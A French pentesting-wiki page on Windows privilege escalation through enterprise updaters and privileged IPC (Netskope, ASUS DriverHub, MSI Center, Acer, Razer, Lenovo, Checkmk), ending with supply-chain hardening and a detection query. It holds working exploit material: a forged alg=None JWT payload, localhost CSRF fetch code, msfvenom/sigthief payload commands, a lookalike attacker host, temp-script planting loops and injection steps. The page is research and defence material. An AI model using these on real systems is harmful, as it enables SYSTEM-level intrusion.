# Abuser des mécanismes de mise à jour automatiques d’entreprise et de l’IPC privilégié (p. ex., Netskope, ASUS et MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une catégorie de chaînes d’élévation de privilèges locale sous Windows, découvertes dans des agents et mécanismes de mise à jour pour terminaux d’entreprise qui exposent une interface IPC facilement accessible et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client pour Windows < R129 (CVE-2025-0309) : un utilisateur peu privilégié peut contraindre l’inscription à utiliser un serveur contrôlé par l’attaquant, puis y récupérer un MSI malveillant que le service SYSTEM installe.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Idées clés réutilisables contre des produits similaires :
- Abuser de l’IPC localhost d’un service privilégié pour forcer une nouvelle inscription ou reconfiguration vers un serveur contrôlé par l’attaquant.
- Implémenter les endpoints de mise à jour du fournisseur, fournir un Trusted Root CA malveillant et indiquer au mécanisme de mise à jour un package malveillant « signé ».
- Contourner les vérifications faibles du signataire (listes d’autorisation CN), les indicateurs de digest facultatifs et les propriétés MSI laxistes.
- Si l’IPC est « chiffré », dériver la clé et l’IV à partir d’identifiants machine lisibles par tous et stockés dans le registre.
- Si le service limite les appelants en fonction du chemin de l’image ou du nom du processus, injecter du code dans un processus autorisé ou en démarrer un en état suspendu, puis amorcer le chargement de votre DLL au moyen d’une modification minimale du contexte d’exécution du thread.

Les services TCP locaux personnalisés méritent le même examen de l’identité et des limites de validation des entrées, même s’ils exigent un PIN ou d’autres identifiants d’application. Associez le listener au processus qui l’héberge et au compte de service effectif, puis examinez le binaire et la version réellement déployés, ainsi que la vérification de longueur des champs contrôlés par l’appelant avant leur copie dans des buffers de taille fixe ou leur utilisation pour construire une commande de processus enfant. Les [recommandations de Microsoft sur les dépassements de buffer](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) expliquent pourquoi les entrées externes non vérifiées sont dangereuses dans du code natif privilégié. Un listener loopback, un identifiant codé en dur ou un nom de processus ne suffisent pas à établir l’existence d’une corruption mémoire ou d’une exécution SYSTEM ; l’accessibilité, l’autorisation, le chemin de code et les mesures d’atténuation restent des conditions distinctes. Lors de l’énumération courante, restez passif au lieu d’envoyer à un service actif des entrées de longueur susceptible de le faire planter.

---
## 1) Forcer l’inscription vers un serveur contrôlé par l’attaquant via l’IPC localhost

De nombreux agents fournissent un processus d’interface utilisateur en mode utilisateur qui communique avec un service SYSTEM via TCP localhost et utilise JSON.

Observé dans Netskope :
- UI : stAgentUI (faible intégrité) ↔ Service : stAgentSvc (SYSTEM)
- ID de commande IPC 148 : IDP_USER_PROVISIONING_WITH_TOKEN

Déroulement de l’exploitation :
1) Créer un token d’inscription JWT dont les claims contrôlent l’hôte du backend (p. ex., AddonUrl). Utiliser alg=None pour ne pas avoir besoin de signature.
2) Envoyer le message IPC qui invoque la commande d’inscription avec votre JWT et le nom du tenant :

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Le service commence à interroger votre serveur malveillant pour l’inscription/la configuration, par exemple :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes :
- Si la vérification de l’appelant repose sur le chemin/le nom, envoyez la requête depuis un binaire du fournisseur autorisé (voir §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Détournement du canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client communique avec votre serveur, implémentez les endpoints attendus et redirigez-le vers un MSI contrôlé par un attaquant. Séquence typique :

1) /v2/config/org/clientconfig → Renvoyez une configuration JSON avec un intervalle de mise à jour très court, par exemple :
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Retourner un certificat CA PEM. Le service l’installe dans le magasin Trusted Root de l’ordinateur local.
3) /v2/checkupdate → Fournir des métadonnées pointant vers un MSI malveillant et une fausse version.

Contournement des vérifications courantes observées sur le terrain :
- Liste d’autorisation des CN de signataire : le service peut uniquement vérifier que le CN du Subject est égal à « netSkope Inc » ou « Netskope, Inc. ». Votre rogue CA peut émettre un certificat leaf avec ce CN et signer le MSI.
- Propriété CERT_DIGEST : inclure une propriété MSI bénigne nommée CERT_DIGEST. Aucune vérification n’est effectuée lors de l’installation.
- Vérification facultative du digest : un indicateur de configuration (p. ex., check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
et exécute du code arbitraire en tant que NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Leçon sur le contournement des correctifs : si un fournisseur réagit en autorisant une petite liste de domaines « de confiance » au lieu d’authentifier cryptographiquement la source de mise à jour, recherchez des redirections ou des proxies inverses appartenant au fournisseur qui vous permettent toujours de diriger le trafic. Dans le cas de Netskope, des recherches publiques ultérieures ont montré qu’une liste d’autorisation de l’ère R129 pouvait encore être contournée via `rproxy.goskope.com`, qui relayait du contenu Azure App Service contrôlé par l’attaquant. Considérez les listes d’autorisation de noms d’hôte comme un ralentisseur, et non comme une frontière de confiance.<sup>[[14]](#references)</sup>

---
## 3) Falsification de requêtes IPC chiffrées (si disponible)

À partir de R127, Netskope a encapsulé le JSON IPC dans un champ encryptData qui ressemble à du Base64. La rétro-ingénierie a révélé l’utilisation d’AES, avec une clé et un IV dérivés de valeurs du registre lisibles par n’importe quel utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un utilisateur standard.<sup>[[1]](#references)[[2]](#references)</sup> Conseil général : si un agent se met soudainement à « chiffrer » son IPC, recherchez les ID de périphérique, les GUID de produit et les ID d’installation sous HKLM qui pourraient servir de matériau.

---
## 4) Contournement des listes d’autorisation des appelants IPC (vérifications du chemin/nom)

Certains services tentent d’authentifier le pair en récupérant le PID de la connexion TCP et en comparant le chemin/nom de l’image à ceux des binaires du fournisseur autorisés, situés sous Program Files (p. ex., stagentui.exe, bwansvc.exe, epdlp.exe).

Deux contournements pratiques :
- Injection de DLL dans un processus autorisé (p. ex., nsdiag.exe), puis relais IPC depuis ce processus.
- Lancer un binaire autorisé en état suspendu et amorcer votre DLL proxy sans CreateRemoteThread (voir §5) pour respecter les règles de protection contre la falsification imposées par le driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatible avec la protection contre la falsification : processus suspendu + patch NtContinue

Les produits incluent souvent un driver minifilter/OB callbacks (p. ex., Stadrv) pour retirer les droits dangereux des handles vers les processus protégés :
- Processus : retire PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : limite les droits à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un chargeur fiable en mode utilisateur qui respecte ces contraintes :
1) Créer un processus à partir d’un binaire du fournisseur avec CREATE_SUSPENDED.
2) Obtenir les handles auxquels vous avez toujours accès : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le processus, et un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou seulement THREAD_RESUME si vous patchez le code à un RIP connu).
3) Remplacer ntdll!NtContinue (ou un autre thunk précoce dont le mappage est garanti) par un petit stub qui appelle LoadLibraryW avec le chemin de votre DLL, puis revient à l’exécution.
4) Appeler ResumeThread pour déclencher votre stub dans le processus et charger votre DLL.

Comme vous n’avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un processus déjà protégé (vous l’avez créé), la politique du driver est respectée.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Outils pratiques
- NachoVPN (plugin Netskope) automatise la création d’un rogue CA, la signature d’un MSI malveillant et la mise à disposition des endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope est un client IPC personnalisé qui forge des messages IPC arbitraires (éventuellement chiffrés avec AES) et inclut l’injection dans un processus suspendu pour émettre les messages depuis un binaire autorisé.<sup>[[4]](#references)</sup>

## 7) Workflow de triage rapide des surfaces inconnues de mise à jour/IPC

Face à un nouvel agent endpoint ou à une suite d’outils « auxiliaires » pour carte mère, un workflow rapide suffit généralement à déterminer si vous avez affaire à une cible prometteuse d’élévation de privilèges :<sup>[[6]](#references)</sup>

1) Énumérer les listeners loopback et les associer aux processus du fournisseur :

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Énumérer les named pipes candidates :

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extraire les données de routage stockées dans le registre et utilisées par les serveurs IPC basés sur des plugins :

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrayez d'abord les noms des points de terminaison, les clés JSON et les ID de commande du client en mode utilisateur. Les interfaces Electron/.NET empaquetées divulguent souvent le schéma complet :

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Recherchez le véritable prédicat de confiance, et pas seulement le chemin de code qui finit par lancer le processus :

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Modèles à prioriser :
- `CryptQueryObject`/l’analyse de certificats sans `WinVerifyTrust` signifie généralement que « le certificat existe » a été interprété comme « le certificat est approuvé », ce qui permet le clonage de certificats ou d’autres astuces avec de faux signataires.
- Les vérifications de sous-chaînes/suffixes sur `Origin`, `Referer`, les URL de téléchargement, les noms de processus ou les CN de signataires ne constituent pas une authentification. `contains(".vendor.com")` est généralement exploitable avec des domaines ressemblants contrôlés par l’attaquant.
- Si l’interface graphique à faibles privilèges décide que « le fichier est fiable » et que le broker SYSTEM ne fait que consommer ce résultat, patcher ou réimplémenter la DLL/le JS côté client permet souvent de contourner entièrement la frontière (validation séparée de type Razer).
- Si le broker copie une charge utile dans `%TEMP%`/`C:\Windows\Temp`, puis la valide ou la planifie depuis cet emplacement, testez immédiatement les fenêtres de remplacement TOCTOU ainsi que les modules de plug-in voisins qui exposent d’autres wrappers `ExecuteTask()` avec des vérifications plus faibles.<sup>[[6]](#references)</sup>

Pour les cibles utilisant beaucoup de named pipes, PipeViewer permet de repérer rapidement les DACL faibles et les pipes accessibles à distance avant de commencer à inverser le protocole en profondeur.<sup>[[11]](#references)</sup>

Si la cible authentifie les appelants uniquement à l’aide du PID, du chemin de l’image ou du nom du processus, considérez cela comme un obstacle mineur plutôt que comme une frontière : injecter du code dans le client légitime, ou établir la connexion depuis un processus sur liste d’autorisation, suffit souvent à satisfaire les vérifications du serveur. Pour les named pipes en particulier, [cette page sur l’usurpation de client et l’abus des pipes](named-pipe-client-impersonation.md) décrit la primitive plus en détail.

Pour un **broker de nettoyage ou de restauration** privilégié, examinez la frontière de confiance des chemins ainsi que l’ACL du pipe. Un appelant moins privilégié peut être en mesure de choisir une destination de restauration ou de renommer un artefact de sauvegarde préparé dans un répertoire partagé, même si l’exécutable du service et son répertoire d’installation sont protégés. Vérifiez séparément que l’appelant peut accéder à la commande de restauration, modifier exactement le fichier d’entrée préparé ou son nom, que le broker s’exécute avec une identité plus privilégiée et que son opération de restauration écrit effectivement dans le chemin protégé choisi. Un répertoire de préparation accessible en écriture ou un pipe lisible ne suffit pas à établir l’existence d’une écriture arbitraire privilégiée ; la correspondance entre destination et chemin ainsi que le comportement du service doivent être examinés dans le code ou testés de manière contrôlée. N’exécutez pas de commande de nettoyage inconnue lors d’une énumération passive, car elle pourrait supprimer des fichiers utilisateur.

---
## 8) Brokers d’add-ins modulaires authentifiés uniquement par des signatures fournisseur (modèle Lenovo Vantage)

Une variante plus récente à rechercher est le **broker RPC à client signé** : un processus de bureau Lenovo signé et à faibles privilèges communique avec un service SYSTEM, et le service achemine des commandes JSON vers un ensemble d’add-ins décrits en XML sous `%ProgramData%`. Dès qu’une exécution de code est obtenue **dans n’importe quel client signé accepté**, chaque contrat `runas="system"` fait partie de la surface d’attaque.<sup>[[15]](#references)</sup>

Primitives à forte valeur observées dans les recherches sur Lenovo Vantage :
- **Faire confiance à l’appelant parce qu’il est signé par le fournisseur** : des chercheurs ont atteint un contexte authentifié en copiant un EXE signé par Lenovo dans un répertoire accessible en écriture et en remplissant les conditions d’un DLL side-load (`profapi.dll`), ce qui a permis d’exécuter du code arbitraire dans un client déjà approuvé par le service.
- **Découverte de la surface d’attaque à partir des manifestes** : les add-ins sont déclarés dans `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` ; plusieurs contrats s’exécutent en tant que `SYSTEM`. L’énumération de ces manifestes révèle souvent les véritables verbes privilégiés plus rapidement que l’inversion du broker lui-même.
- **Bugs propres à chaque commande derrière le canal authentifié** : une fois à l’intérieur du client approuvé, les recherches publiques ont mis au jour des vulnérabilités de traversée de chemin et des conditions de concurrence dans les verbes de mise à jour/installation, l’abus de SQL brut dans des bases de données de paramètres privilégiées et des vérifications de chemin de registre fondées sur des sous-chaînes qui permettaient des écritures hors de la ruche prévue.

Reconnaissance utile sur une cible :

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Conclusion pratique : chaque fois qu’une suite d’utilitaires expose un broker qui authentifie d’abord le **processus appelant**, puis distribue les requêtes à des dizaines de commandes de plugin/add-in, ne vous arrêtez pas après avoir contourné le contrôle de confiance initial. Extrayez la table des manifestes/contrats et fuzz chacun des verbes à privilèges élevés de manière indépendante ; le canal authentifié dissimule généralement plusieurs bugs de seconde phase.

---
## 1) CSRF du navigateur vers localhost contre des API HTTP privilégiées (ASUS DriverHub)

DriverHub fournit un service HTTP en mode utilisateur (ADU.exe) sur 127.0.0.1:53000, qui attend des appels du navigateur provenant de https://driverhub.asus.com. Le filtre d’origine effectue simplement `string_contains(".asus.com")` sur l’en-tête Origin et sur les URL de téléchargement exposées par `/asus/v1.0/*`. Tout hôte contrôlé par un attaquant, comme `https://driverhub.asus.com.attacker.tld`, passe donc la vérification et peut envoyer des requêtes modifiant l’état depuis du JavaScript.<sup>[[6]](#references)</sup> Consultez les [bases de la CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) pour découvrir d’autres techniques de contournement.

Déroulement pratique :
1) Enregistrez un domaine qui contient `.asus.com` et hébergez-y une page Web malveillante.
2) Utilisez `fetch` ou XHR pour appeler un endpoint privilégié (par exemple, `Reboot` ou `UpdateApp`) sur `http://127.0.0.1:53000`.
3) Envoyez le corps JSON attendu par le gestionnaire ; le JS frontend empaqueté révèle le schéma ci-dessous.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Même la CLI PowerShell présentée ci-dessous réussit lorsque l’en-tête Origin est spoofé avec la valeur de confiance :

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Toute visite du site de l’attaquant depuis un navigateur devient donc un CSRF local en 1 clic (ou 0 clic via `onload`) qui pilote un helper SYSTEM.

---
## 2) Vérification insecure de signature de code et clonage de certificat (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique de sous-chaîne : `http://updates.asus.com.attacker.tld:8000/payload.exe` est donc accepté. Après le téléchargement, ADU.exe vérifie simplement que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter — sans `WinVerifyTrust` ni validation de chaîne.

Pour exploiter ce flux :
1) Créez un payload (p. ex. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonez le signataire d’ASUS dans ce fichier (p. ex. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hébergez `pwn.exe` sur un domaine ressemblant à `.asus.com` et déclenchez UpdateApp via le CSRF de navigateur ci-dessus.

Comme les filtres Origin et URL reposent tous deux sur des sous-chaînes et que la vérification du signataire ne compare que des chaînes, DriverHub télécharge et exécute le binaire de l’attaquant avec ses privilèges élevés.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU dans les chemins de copie et d’exécution de l’updater (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque trame se compose de `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son gestionnaire :
1) Copie l’exécutable fourni dans `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le sujet du certificat doit être égal à “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une tâche planifiée qui exécute le fichier temporaire comme SYSTEM avec des arguments contrôlés par l’attaquant.

Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer la trame A qui pointe vers un binaire légitime signé par MSI (ce qui garantit la réussite de la vérification de signature et la mise en file d’attente de la tâche).
- La faire entrer en concurrence avec des messages répétés de trame B pointant vers un payload malveillant, qui écrasent `MSI Center SDK.exe` juste après la fin de la vérification.

Lorsque le planificateur se déclenche, il exécute le payload écrasé avec les privilèges SYSTEM, bien que le fichier d’origine ait été validé. Une exploitation fiable utilise deux goroutines/threads qui envoient en boucle `CMD_AutoUpdateSDK` jusqu’à remporter la fenêtre TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Exploitation de l’IPC personnalisé au niveau SYSTEM et de l’impersonation (MSI Center + Acer Control Centre)

### Ensembles de commandes TCP de MSI Center
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers octets d’une trame sélectionnent ce composant, ce qui permet aux attaquants d’acheminer les commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres exécutants de tâches. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` **sans validation de signature** — tout utilisateur local peut lui indiquer `C:\Users\<user>\Desktop\payload.exe` et obtenir de manière déterministe une exécution SYSTEM.
- L’interception du trafic loopback avec Wireshark ou l’instrumentation des binaires .NET dans dnSpy révèle rapidement la correspondance entre Component et commandes ; des clients Go/Python personnalisés peuvent ensuite rejouer les trames.<sup>[[6]](#references)</sup>

### Named pipes d’Acer Control Centre et niveaux d’impersonation
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et sa liste de contrôle d’accès discrétionnaire autorise les clients distants (p. ex. `\\TARGET\pipe\treadstone_service_LightMode`). L’envoi de l’ID de commande `7` avec un chemin de fichier invoque la routine du service qui lance des processus.
- La bibliothèque cliente sérialise un octet de terminaison magique (113) avec les arguments. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le gestionnaire natif associe cette valeur à un `SECURITY_IMPERSONATION_LEVEL` et à un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) mène à la branche générique, qui conserve le jeton SYSTEM complet et définit un SID de haute intégrité (`S-1-16-12288`). Le binaire lancé s’exécute donc avec des privilèges SYSTEM sans restriction, localement comme d’une machine à l’autre.
- Combinez cela avec l’option d’installation exposée (`Setup.exe -nocheck`) pour installer ACC même sur des VM de laboratoire et tester le pipe sans matériel du fabricant.<sup>[[6]](#references)</sup>

Ces bogues IPC montrent pourquoi les services localhost doivent imposer une authentification mutuelle (SID ALPC, filtres `ImpersonationLevel=Impersonation`, filtrage des jetons) et pourquoi le helper « run arbitrary binary » de chaque module doit appliquer les mêmes vérifications de signature.

---
## 3) Helpers COM/IPC « elevator » reposant sur une validation faible en mode utilisateur (Razer Synapse 4)

Razer Synapse 4 a ajouté un autre exemple utile à cette famille : un utilisateur peu privilégié peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL en mode utilisateur (`simple_service.dll`) au lieu d’être appliquée de manière robuste à l’intérieur de la frontière privilégiée.

Chemin d’exploitation observé :
- Instancier l’objet COM `RzUtility.Elevator`.
- Appeler `LaunchProcessNoWait(<path>, "", 1)` pour demander un lancement avec élévation de privilèges.
- Dans le PoC public, le contrôle de signature PE dans `simple_service.dll` est neutralisé avant l’envoi de la requête, ce qui permet de lancer un exécutable arbitraire choisi par l’attaquant.<sup>[[6]](#references)[[10]](#references)</sup>

Invocation PowerShell minimale :

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusion générale : lors de l’analyse de suites « helper », ne vous limitez pas au TCP localhost ou aux named pipes. Vérifiez la présence de classes COM portant des noms comme `Elevator`, `Launcher`, `Updater` ou `Utility`, puis déterminez si le service privilégié valide lui-même le binaire cible ou s’il se contente de faire confiance à un résultat calculé par une DLL cliente en mode utilisateur modifiable. Ce schéma ne se limite pas à Razer : toute architecture répartie où le broker à hauts privilèges consomme une décision d’autorisation ou de refus provenant de la partie à faibles privilèges constitue une surface potentielle de privesc.


---
## Exécution de scripts temporaires prévisibles lors de la réparation MSI (Checkmk Agent / CVE-2024-0670)

Certains agents Windows exécutent encore des actions privilégiées en écrivant un fichier `.cmd` temporaire dans `C:\Windows\Temp`, puis en l’exécutant en tant que `SYSTEM`. Si le nom du fichier est prévisible et que le service ne recrée pas correctement les fichiers existants, un utilisateur à faibles privilèges peut créer à l’avance le futur fichier temporaire en **lecture seule** et forcer le processus privilégié à exécuter du contenu contrôlé par l’attaquant à la place de son propre script.

Observé dans les versions vulnérables de Checkmk Agent :
- motif temporaire : `cmk_all_<PID>_1.cmd`
- branches concernées : `2.0.0`, `2.1.0`, `2.2.0`
- déclencheur : **réparation** MSI du package agent mis en cache<sup>[[8]](#references)[[9]](#references)</sup>

Procédure pratique :
1. Estimez une plage réaliste de PID à partir des ID de processus actuels ou du PID de l’agent en cours d’exécution.
2. Écrivez une courte charge utile `.cmd` en **ASCII** (`Set-Content -Encoding Ascii` ou redirection de `cmd.exe` ; évitez la sortie PowerShell en UTF-16 pour les fichiers batch).
3. Créez en masse `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dans la plage candidate et marquez chaque fichier en lecture seule.
4. Déclenchez une réparation du MSI mis en cache afin que le service privilégié tente de régénérer, puis exécute, le script temporaire.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Si le produit vulnérable est installé avec Windows Installer, associez le fichier MSI en cache au nom d’apparence aléatoire dans `C:\Windows\Installer` à son nom de produit avant de déclencher la réparation :<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notes opérationnelles :
- `qwinsta` est utile lorsque `msiexec /fa` échoue depuis un shell WinRM non interactif et qu’il faut déterminer si une session de bureau existante ou déconnectée peut déclencher correctement la réparation.<sup>[[7]](#references)</sup>
- Ce modèle s’applique à d’autres agents de terminaux et programmes de mise à jour qui **placent des scripts temporaires dans des emplacements accessibles en écriture à tous, puis les exécutent en tant que SYSTEM**. Recherchez des noms prévisibles, l’absence de sémantique de création exclusive, ainsi que des processus de réparation/mise à jour pouvant être déclenchés à la demande.

### Réparation interactive de l’installateur et console privilégiée

PDF24 Creator 11.15.1 illustre un risque distinct lié à la réparation MSI : son action personnalisée d’installation de l’imprimante peut lancer une console visible avec des droits SYSTEM pendant la réparation. L’éditeur a modifié l’installateur MSI dans la version 11.15.2 pour corriger ce comportement. Une ancienne version du produit constitue uniquement une piste de triage. Vérifiez le package MSI enregistré ou accessible, si cet utilisateur peut lancer une réparation, si l’action personnalisée vulnérable et le délai lié au fichier journal sont présents, et si un bureau interactif peut exposer la console. Le délai signalé utilisait un oplock sur `faxPrnInst.log` ; le fait que le fichier soit accessible en écriture n’est pas la seule condition d’accès. Un shell non interactif, un package inaccessible ou un installateur corrigé peuvent interrompre la chaîne. Ce problème ne dépend pas de `AlwaysInstallElevated` et diffère du remplacement d’un script temporaire prévisible.

---
## Détournement de la chaîne d’approvisionnement à distance via une validation faible du programme de mise à jour (WinGUp / Notepad++)

Entre juin 2025 et décembre 2025, des attaquants ayant compromis l’infrastructure d’hébergement du processus de mise à jour de Notepad++ ont transmis de manière sélective des manifestes malveillants à des victimes ciblées. Les anciennes versions des programmes de mise à jour basés sur WinGUp ne vérifiaient pas entièrement l’authenticité des mises à jour ; une réponse XML hostile pouvait donc rediriger les clients vers des URL contrôlées par les attaquants. Comme le client acceptait le contenu HTTPS sans exiger à la fois une chaîne de certificats de confiance et une signature PE valide pour l’installateur téléchargé, les victimes récupéraient et exécutaient un `update.exe` NSIS piégé.<sup>[[12]](#references)[[13]](#references)</sup>

Processus opérationnel (aucun exploit local requis) :
1. **Interception de l’infrastructure** : compromettre le CDN/l’hébergement et répondre aux vérifications de mise à jour avec des métadonnées d’attaquant pointant vers une URL de téléchargement malveillante.
2. **NSIS piégé** : l’installateur récupère/exécute une charge utile et exploite deux chaînes d’exécution :
   - **Binaire signé fourni par l’attaquant + sideload** : inclure le fichier signé Bitdefender `BluetoothService.exe` et déposer un `log.dll` malveillant dans son chemin de recherche. À l’exécution du binaire signé, Windows charge `log.dll` par sideload ; celle-ci déchiffre et charge de manière réflexive la porte dérobée Chrysalis (protégée par Warbird et utilisant le hachage d’API pour gêner la détection statique).
   - **Injection de shellcode par script** : NSIS exécute un script Lua compilé qui utilise des API Win32 (p. ex. `EnumWindowStationsW`) pour injecter du shellcode et déployer Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mesures de durcissement et de détection pour tout programme de mise à jour automatique :
- Exiger la **vérification du certificat et de la signature** de l’installateur téléchargé (épingler le signataire de l’éditeur, rejeter les CN/chaînes non concordants) et signer le manifeste de mise à jour lui-même (p. ex. XMLDSig). Bloquer les redirections contrôlées par le manifeste tant qu’elles ne sont pas validées.
- Considérer le **sideload d’un binaire signé fourni par l’attaquant** comme un pivot de détection après le téléchargement : déclencher une alerte lorsqu’un EXE signé d’un éditeur charge une DLL dont le nom provient de l’extérieur de son chemin d’installation canonique (p. ex. Bitdefender chargeant `log.dll` depuis Temp/Downloads), ainsi que lorsqu’un programme de mise à jour dépose/exécute des installateurs depuis un répertoire temporaire avec des signatures autres que celles de l’éditeur.
- Surveiller les **artefacts spécifiques aux malwares** observés dans cette chaîne (utiles comme pivots génériques) : mutex `Global\Jdhfv_1.0.1`, écritures anormales de `gup.exe` dans `%TEMP%` et étapes d’injection de shellcode pilotées par Lua.
- Notepad++ a renforcé WinGUp à partir de la version 8.8.9 : le XML renvoyé est désormais signé (XMLDSig), et les versions récentes exigent la vérification du certificat et de la signature de l’installateur téléchargé au lieu de se fier uniquement au transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideload de <code>log.dll</code> par un EXE signé Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
